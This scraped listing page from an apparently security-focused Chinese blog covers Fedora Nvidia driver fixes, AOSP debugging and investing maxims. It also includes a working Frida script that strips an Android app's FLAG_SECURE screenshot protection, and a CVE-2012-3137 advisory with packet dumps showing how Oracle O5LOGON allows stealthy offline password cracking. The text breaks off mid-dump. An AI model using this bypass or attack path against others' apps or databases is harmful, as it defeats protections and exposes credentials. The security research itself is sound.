-<p>（八）每个阶段的侧重点是不一样的。在高位的时候，我们要做计算题，要定量。因为一只股票涨了这么多、这么长时间，它的方向一定是没有问题的，这个时候你再去做定性研究意义不大。在低位的时候，如果你再去算账，就很容易吃大亏。它跌了这么久，那一定是方向上出了问题，你要把方向给想明白。如果能把方向证伪掉，是不需要考虑定量的问题，因为低位天然带有弹性和赔率。</p>
-<p>（九）真正的投机应该是在价值的基础上进行的，是通过充分的价值理解后，将其在不同人群或环境下进行切换来获益。它认识到价值有主观倾向性和个性化的特点，价值不是个稳定具体的东西，也不存在用什么方法推算的公允值，因为资本以及资本后面的人是丰富不同的，他们有着不同的成本和收益预期，在各种市场环境下也会有着不同的预期因子和贴现率，而这些在乘数和复利计算的基础下就会有着巨大的差异。这也说明了为什么理性且信息充分对称的人之间也可以产生交易并实现双赢，其原因就在于他们有着不同的价值观、需求特点和满足感。</p>
-<p>（十）长线投资很多人认为这是最容易做的，只要买进不动就可以了，其实这完全是误解。在所有的操作策略中，长线的要求最高。他需要对企业有着极为深刻的认识，对自己有着更为坚强的控制。他清楚把握企业未来数年的发展趋势，以投资的心态分享企业的成长。他的标的物是千里挑一，在这样的机会面前它不会惧怕任何亏损，不会设置除基本面外的任何止损指标。自信、尊重客观价值、不理会乃至勇于对抗市场是必备的投资品质，日常的波动在这样的前景面前是不应去考虑的。只有这样，股票才能够真正成为改变一生的东西。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/Fedora36-Nvidia/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/Fedora36-Nvidia/" class="post-title-link" itemprop="url">升级 Fedora 36，遇上 Nvidia 驱动问题</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-09-06 11:00:51" itemprop="dateCreated datePublished" datetime="2023-09-06T11:00:51+08:00">2023-09-06</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>Fedora 36 正式版已经释出一段时间了，根据我的经验开始的一周都会有 bug，一般等一段时间再升级会更平滑一些。然而，老革命又遇上了新问题，显示出问题了启动不起来。我已经很久没有遇上显示驱动问题了，我在很久以前就禁用了开源驱动 <code>nouveau</code>，一直都用得很好。</p>
-<p>修改 &#x2F;etc&#x2F;default&#x2F;grub 文件，在 <code>GRUB_CMDLINE_LINUX</code> 添加下面参数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRUB_CMDLINE_LINUX=&quot;... rd.driver.blacklist=nouveau modprobe.blacklist=nouveau nvidia-drm.modeset=1&quot;</span><br></pre></td></tr></table></figure>
-
-<p>重新生成 grub 文件， <code>sudo grub2-mkconfig -o /boot/grub2/grub.cfg</code>，但是在升级 Fedora 36 后似乎没有起作用。诡异的是 Fedora 35 的内核却可以正常工作，首先怀疑的是 nvidia 驱动可能没有安装对。执行下面命令行</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo dnf reinstall xorg-x11-drv-nvidia akmod-nvidia kmod-nvidia.x86_64</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>
-
-<p>可惜没有解决问题，上网找资料看看 Fedora 36 有没什么特殊的地方。安装 Nvidia 驱动网上有这篇文章说的详细<br><a target="_blank" rel="noopener" href="https://www.linuxcapable.com/how-to-install-nvidia-drivers-on-fedora-36-linux/">https://www.linuxcapable.com/how-to-install-nvidia-drivers-on-fedora-36-linux/</a><br>仔细拜读了一下，还是没有发现啥问题，驱动也重新安装了啊，开始怀疑是新版 Nvidia 驱动的问题</p>
-<p><code>sudo dnf search xorg-x11-drv-nvidia</code> 可以查看所有的驱动，<code>xorg-x11-drv-nvidia-340xx</code> <code>xorg-x11-drv-nvidia-340xx</code> <code>xorg-x11-drv-nvidia-340xx</code> 不知道到底需要安装哪个版本的驱动。😭</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">xorg-x11-drv-nvidia.x86_64 : NVIDIA&#x27;s proprietary display driver for NVIDIA graphic cards</span><br><span class="line">=========================================================================== 名称 和 概况 匹配：xorg-x11-drv-nvidia</span><br><span class="line">xorg-x11-drv-nvidia-340xx-cuda.x86_64 : CUDA libraries for xorg-x11-drv-nvidia-340xx</span><br><span class="line">xorg-x11-drv-nvidia-340xx-devel.i686 : Development files for xorg-x11-drv-nvidia-340xx</span><br><span class="line">xorg-x11-drv-nvidia-340xx-devel.x86_64 : Development files for xorg-x11-drv-nvidia-340xx</span><br><span class="line">xorg-x11-drv-nvidia-340xx-kmodsrc.x86_64 : xorg-x11-drv-nvidia-340xx kernel module source code</span><br><span class="line">xorg-x11-drv-nvidia-340xx-libs.i686 : Libraries for xorg-x11-drv-nvidia-340xx</span><br><span class="line">xorg-x11-drv-nvidia-340xx-libs.x86_64 : Libraries for xorg-x11-drv-nvidia-340xx</span><br><span class="line">xorg-x11-drv-nvidia-390xx-cuda.x86_64 : CUDA driver for xorg-x11-drv-nvidia-390xx</span><br><span class="line">xorg-x11-drv-nvidia-390xx-cuda-libs.i686 : CUDA libraries for xorg-x11-drv-nvidia-390xx</span><br><span class="line">xorg-x11-drv-nvidia-390xx-cuda-libs.x86_64 : CUDA libraries for xorg-x11-drv-nvidia-390xx</span><br><span class="line">xorg-x11-drv-nvidia-390xx-devel.i686 : Development files for xorg-x11-drv-nvidia-390xx</span><br><span class="line">xorg-x11-drv-nvidia-390xx-devel.x86_64 : Development files for xorg-x11-drv-nvidia-390xx</span><br><span class="line">xorg-x11-drv-nvidia-390xx-kmodsrc.x86_64 : xorg-x11-drv-nvidia-390xx kernel module source code</span><br><span class="line">xorg-x11-drv-nvidia-390xx-libs.i686 : Libraries for xorg-x11-drv-nvidia-390xx</span><br><span class="line">xorg-x11-drv-nvidia-390xx-libs.x86_64 : Libraries for xorg-x11-drv-nvidia-390xx</span><br><span class="line">xorg-x11-drv-nvidia-470xx-cuda.x86_64 : CUDA driver for xorg-x11-drv-nvidia-470xx</span><br><span class="line">xorg-x11-drv-nvidia-470xx-cuda-libs.i686 : CUDA libraries for xorg-x11-drv-nvidia-470xx</span><br><span class="line">xorg-x11-drv-nvidia-470xx-cuda-libs.x86_64 : CUDA libraries for xorg-x11-drv-nvidia-470xx</span><br><span class="line">xorg-x11-drv-nvidia-470xx-devel.i686 : Development files for xorg-x11-drv-nvidia-470xx</span><br><span class="line">xorg-x11-drv-nvidia-470xx-devel.x86_64 : Development files for xorg-x11-drv-nvidia-470xx</span><br><span class="line">xorg-x11-drv-nvidia-470xx-kmodsrc.x86_64 : xorg-x11-drv-nvidia-470xx kernel module source code</span><br><span class="line">xorg-x11-drv-nvidia-470xx-libs.i686 : Libraries for xorg-x11-drv-nvidia-470xx</span><br><span class="line">xorg-x11-drv-nvidia-470xx-libs.x86_64 : Libraries for xorg-x11-drv-nvidia-470xx</span><br></pre></td></tr></table></figure>
-
-<p>可是仔细一琢磨， Fedora 35 Nvidia 驱动不是工作正常吗，可以上去看看用的是哪个版本的驱动，执行命令 <code>nvidia-settings</code>,在 System Information 中发现使用的就是最新版本的驱动 <strong>510.68.02</strong>，看样子最新版本的驱动也没有问题，一下陷入了困境。😰</p>
-<p>没啥好办法，还是 Google 搜索一下，结果发现了一个链接在讨论这个问题，和我遇上的现象一样，作者最终解决了问题<br><a target="_blank" rel="noopener" href="https://ask.fedoraproject.org/t/fedora-linux-kernel-update-breaks-nvidia-driver/21954/11">Fedora Linux kernel update breaks NVIDIA driver</a></p>
-<p>原来是旧版的驱动没有卸载干净，参考 <a target="_blank" rel="noopener" href="https://rpmfusion.org/Howto/NVIDIA#Uninstall_the_NVIDIA_driver">https://rpmfusion.org/Howto/NVIDIA#Uninstall_the_NVIDIA_driver</a><br>驱动卸载 Nvidia 驱动需要使用命令 <code>dnf remove xorg-x11-drv-nvidia\*</code></p>
-<p>按照下面的命令操作了一遍，重启系统，熟悉的登录界面终于又出现了。😄</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo dnf remove xorg-x11-drv-nouveau</span><br><span class="line">sudo dnf remove xorg-x11-drv-nvidia\*</span><br><span class="line">sudo dnf install xorg-x11-drv-nvidia akmod-nvidia kmod-nvidia.x86_64</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/Fedora31/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/Fedora31/" class="post-title-link" itemprop="url">Fedora31 的几个变化</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-09-06 11:00:51" itemprop="dateCreated datePublished" datetime="2023-09-06T11:00:51+08:00">2023-09-06</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="1-默认启用-Cgroups-V2"><a href="#1-默认启用-Cgroups-V2" class="headerlink" title="1. 默认启用 Cgroups V2"></a>1. 默认启用 Cgroups V2</h2><p>nozuonodie， 升级到 Fedora 31 后， CgroupsV2 已经默认开启，理由是原来不是默认开启没人用，现在让 Fedora 用户先当当小白鼠，<br>于是 Docker 就倒下了。<a target="_blank" rel="noopener" href="http://t.cn/Ai1sI5LH">http://t.cn/Ai1sI5LH</a>   grub2 配置文件 &#x2F;etc&#x2F;default&#x2F;grub， 内核参数添加 systemd.unified_cgroup_hierarchy&#x3D;0<br>可以重新开启  CgroupsV1 ​​​​</p>
-<h2 id="2-默认的-Python-为-Python3"><a href="#2-默认的-Python-为-Python3" class="headerlink" title="2. 默认的 Python 为 Python3"></a>2. 默认的 Python 为 Python3</h2><p><a target="_blank" rel="noopener" href="https://fedoraproject.org/wiki/Changes/Python_means_Python3">https://fedoraproject.org/wiki/Changes/Python_means_Python3</a></p>
-<p>唉，不得不说 Fedora 这次有点太激进了， 搞得我编译 chromium 又出问题了。 要换回去有个歪招</p>
-<p><code>ln -s /usr/bin/python2 /usr/local/bin/python</code></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/disable_security_flags/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/disable_security_flags/" class="post-title-link" itemprop="url">恢复 Android App 的截屏功能</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-09-06 11:00:51" itemprop="dateCreated datePublished" datetime="2023-09-06T11:00:51+08:00">2023-09-06</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>今天遇上某 App 禁止截屏，其实就是使用了下面这段代码</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getWindow().setFlags(LayoutParams.FLAG_SECURE, LayoutParams.FLAG_SECURE);</span><br></pre></td></tr></table></figure>
-
-
-<p>使用 frida 脚本可以绕过绕过这个限制 （使用 frida 需要将手机 root）。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">   <span class="comment">// https://developer.android.com/reference/android/view/WindowManager.LayoutParams.html#FLAG_SECURE</span></span><br><span class="line">   <span class="keyword">var</span> <span class="variable constant_">FLAG_SECURE</span> = <span class="number">0x2000</span>;</span><br><span class="line">   <span class="keyword">var</span> <span class="title class_">Window</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.view.Window&quot;</span>);</span><br><span class="line">   <span class="keyword">var</span> setFlags = <span class="title class_">Window</span>.<span class="property">setFlags</span>;  <span class="comment">//.overload(&quot;int&quot;, &quot;int&quot;)</span></span><br><span class="line"></span><br><span class="line">   setFlags.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">flags, mask</span>) &#123;</span><br><span class="line">       <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Disabling FLAG_SECURE...&quot;</span>);</span><br><span class="line">       flags &amp;= ~<span class="variable constant_">FLAG_SECURE</span>;</span><br><span class="line">       setFlags.<span class="title function_">call</span>(<span class="variable language_">this</span>, flags, mask);</span><br><span class="line">       <span class="comment">// Since setFlags returns void, we don&#x27;t need to return anything</span></span><br><span class="line">   &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<p>执行 frida 命令 <code>frida -U -l disable.js -n com.apps.android --no-pause</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ frida -U -l disable.js -n com.apps.android --no-pause</span><br><span class="line"></span><br><span class="line">[Pixel 2::com.apps.android]-&gt;</span><br><span class="line">[Pixel 2::com.apps.android]-&gt;</span><br><span class="line">[Pixel 2::com.apps.android]-&gt; Disabling FLAG_SECURE...</span><br><span class="line">Disabling FLAG_SECURE...</span><br><span class="line">Disabling FLAG_SECURE...</span><br><span class="line">Disabling FLAG_SECURE...</span><br><span class="line">Disabling FLAG_SECURE...</span><br><span class="line">Disabling FLAG_SECURE...</span><br><span class="line">Disabling FLAG_SECURE...</span><br><span class="line">Disabling FLAG_SECURE...</span><br><span class="line">Disabling FLAG_SECURE...</span><br><span class="line">Disabling FLAG_SECURE...</span><br></pre></td></tr></table></figure>
-
-<p>值得注意的是，这里使用了 <code>-n</code> 参数， attach 到目标进程，要不 App 会自动重启。看到输出调试信息后，<br>就可以正常截屏了。</p>
-<h3 id="使用-objection"><a href="#使用-objection" class="headerlink" title="使用 objection"></a>使用 objection</h3><p>objection「2」有此功能，执行下面命令即可： <code>android ui FLAG_SECURE false</code>  但是我测试失败了。</p>
-<h3 id="截屏小技巧-（lzx）"><a href="#截屏小技巧-（lzx）" class="headerlink" title="截屏小技巧 （lzx）"></a>截屏小技巧 （lzx）</h3><p>Android 截屏，可以使用一个快速的技巧  <code>adb exec-out screencap -p &gt; test.png</code></p>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
-<li>[1] <a target="_blank" rel="noopener" href="https://bhamza.me/2019/11/03/Android-Frida-hooking-disabling-FLAG-SECURE.html">https://bhamza.me/2019/11/03/Android-Frida-hooking-disabling-FLAG-SECURE.html</a></li>
-<li>[2] <a target="_blank" rel="noopener" href="https://github.com/sensepost/objection">https://github.com/sensepost/objection</a></li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/debug_aosp_java_code/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/debug_aosp_java_code/" class="post-title-link" itemprop="url">调试AOSP Java 代码</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-09-06 11:00:51" itemprop="dateCreated datePublished" datetime="2023-09-06T11:00:51+08:00">2023-09-06</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>下载 Android 源代码，编译</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">source</span> build/envsetup.sh</span><br><span class="line">$ lunch</span><br><span class="line">$ make</span><br><span class="line">$ mmm development/tools/idegen/</span><br><span class="line">$ ./development/tools/idegen/idegen.sh</span><br></pre></td></tr></table></figure>
-
-<p>运行后将生成下面几个文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">android.ipr (IntelliJ / Android Studio)</span><br><span class="line">android.iml (IntelliJ / Android Studio)</span><br><span class="line">.classpath  (Eclipse)</span><br></pre></td></tr></table></figure>
-
-
-<ol>
-<li>在Android Studio 中导入 android.ipr</li>
-</ol>
-<p>File -&gt; Open 选择 android.ipr, 导入后可以Android Studio 中浏览AOSP 源码</p>
-<ol start="2">
-<li>设置远程调试配置文件</li>
-</ol>
-<p>Run -&gt; Edit Configuration 点击左上角的 + 类型选择 Remote</p>
-<ol start="3">
-<li>Attack 到需要调试的进程</li>
-</ol>
-<p>这里有两种方法，一是使用SDK 提供的 Monitor 二是使用 Android Studio 自带的<br>Attach debugger to Android Process 按钮。 </p>
-<p>连接成功后将看到 Connected to the target VM</p>
-<ol start="4">
-<li>设置断点</li>
-</ol>
-<p>设置断点很简单，用鼠标点击源码文件的左边栏，看见红色圆点说明就已经设置成功了。也<br>可以使用Ctrl + F8 的快捷键。</p>
-<ol start="5">
-<li>运行程序，触发断点</li>
-</ol>
-<p>需要注意的是在调试过程中会出现源码对不上的情况，需要自己选择正确的源码。关于哪些<br>进程可以调试的问题，上篇已经有记录，这里就不在说了。</p>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol>
-<li>AOSP Sources in the IDE<br><a target="_blank" rel="noopener" href="https://newcircle.com/s/post/1720/aosp_sources_in_the_ide">https://newcircle.com/s/post/1720/aosp_sources_in_the_ide</a></li>
-<li>Debugging AOSP Platform code with Android Studio - Part I - Java Debugger<br><a target="_blank" rel="noopener" href="http://ronubo.blogspot.sg/2016/01/debugging-aosp-platform-code-with.html">http://ronubo.blogspot.sg/2016/01/debugging-aosp-platform-code-with.html</a></li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/cve-2012-3137/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/cve-2012-3137/" class="post-title-link" itemprop="url">Oracle Database身份验证协议安全限制绕过漏洞(CVE-2012-3137)</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-09-06 11:00:51" itemprop="dateCreated datePublished" datetime="2023-09-06T11:00:51+08:00">2023-09-06</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">NSFOCUS ID:    20847</span><br><span class="line">BUGTRAQ ID:    55651</span><br><span class="line">CVE ID:        CVE-2012-3137</span><br><span class="line">远程漏洞：      是</span><br><span class="line">本地漏洞：      是</span><br><span class="line">漏洞类型：</span><br><span class="line">漏洞影响：      远程攻击者可以密码进行离线密码暴力破解</span><br><span class="line">危险指数：      高</span><br><span class="line">创建时间：      2012-9-27</span><br><span class="line">更新时间：</span><br><span class="line">攻击代码：      无</span><br><span class="line"></span><br><span class="line">跟踪工程师：    zz</span><br></pre></td></tr></table></figure>
-
-<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述:"></a>漏洞概述:</h2><p>Oracle是一款广泛被使用的商业数据库。</p>
-<p>Oracle O5LOGON认证协议存在漏洞，这个漏洞可以使攻击者离线暴力破解Oracle数据库密码，<br>从而访问受保护的Oracle数据库中的数据。要利用这个漏洞攻击者只需要知道一个合法的<br>数据库用户名和一个正确的数据库名(SID)，不需要使用中间人攻击。</p>
-<p>Martinez Fayo 在2010年5月向Oracle报告了这个问题，Oracle在2011年的中期通过patch<br> set 11.2.0.3修复了这个漏洞，使用了新版本的协议。但是Oracle没有在 11.1和11.2 中<br>修复这个问题，因此这些版本仍然存在漏洞。</p>
-<p>由于漏洞发生在认证阶段的早期，获取需要的数据后马上断开连接，不会在Oracle数据库<br>里留下登录日志，因此这个漏洞被称为 “stealth password cracking vulnerability”</p>
-<p>细节：</p>
-<p>O5LOGON 过程</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">         send username</span><br><span class="line">Client -----------------------------&gt; Server</span><br><span class="line"></span><br><span class="line">         AUTH_SESSKEY  AUTH_VFR_DATA</span><br><span class="line">Client &lt;----------------------------  Server</span><br><span class="line"></span><br><span class="line">         AUTH_SESSKEY  AUTH_PASSWORD</span><br><span class="line">Clinet -----------------------------&gt; Server</span><br></pre></td></tr></table></figure>
-
-<p>和这个漏洞相关的两个报文，包含了需要的信息, 如下：</p>
-<p>(1) Server -&gt; client</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0000   00 f8 00 00 06 00 00 00 00 00 08 02 00 0c 00 00  ................</span><br><span class="line">0010   00 0c 41 55 54 48 5f 53 45 53 53 4b 45 59 60 00  ..AUTH_SESSKEY`.</span><br><span class="line">0020   00 00 60 35 32 46 43 30 34 42 31 46 46 38 31 31  ..`52FC04B1FF811</span><br><span class="line">0030   30 43 41 31 32 36 33 44 46 35 42 43 36 31 41 37  0CA1263DF5BC61A7</span><br><span class="line">0040   45 35 37 37 34 30 43 38 41 35 31 31 31 44 32 32  E57740C8A5111D22</span><br><span class="line">0050   42 34 31 45 35 33 43 43 31 36 37 46 44 46 32 41  B41E53CC167FDF2A</span><br><span class="line">0060   36 38 37 38 39 35 38 32 30 30 44 39 42 32 42 36  6878958200D9B2B6</span><br><span class="line">0070   41 35 31 43 39 35 44 37 37 39 46 44 45 42 41 42  A51C95D779FDEBAB</span><br><span class="line">0080   42 36 39 00 00 00 00 0d 00 00 00 0d 41 55 54 48  B69.........AUTH</span><br><span class="line">0090   5f 56 46 52 5f 44 41 54 41 14 00 00 00 14 34 33  _VFR_DATA.....43</span><br><span class="line">00a0   45 30 42 45 32 30 42 33 32 42 30 42 42 37 36 45  E0BE20B32B0BB76E</span><br><span class="line">00b0   35 37 25 1b 00 00 04 01 00 00 00 02 00 00 00 00  57%.............</span><br><span class="line">00c0   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00d0   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00e0   00 00 00 02 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00f0   00 00 00 00 00 00 00 00                          ........</span><br></pre></td></tr></table></figure>
-
-
-<p>(2) server &lt;- client</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 